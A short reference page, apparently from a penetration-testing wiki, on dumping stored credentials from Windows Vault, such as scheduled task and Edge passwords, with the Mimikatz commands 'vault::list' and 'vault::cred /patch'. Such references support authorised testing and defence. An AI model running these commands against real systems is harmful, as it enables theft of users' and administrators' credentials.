---
label: Windows Vault
---

# Credentials dump from Windows Vault

For some reason, Windows keeps scheduled task credentials in Credentials Vault. There are also other cases when credentials are stored in the Windows Vault (e.g. built-in Edge password management). We can retrieve them using Mimikatz.

Windows:

```powershell
.\mimikatz.exe

# List vault credentials
> vault::list

# Dump credentials
> vault::cred /patch
```

## References

* [Benjamin Delpy, _Scheduled tasks credentials_](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials)
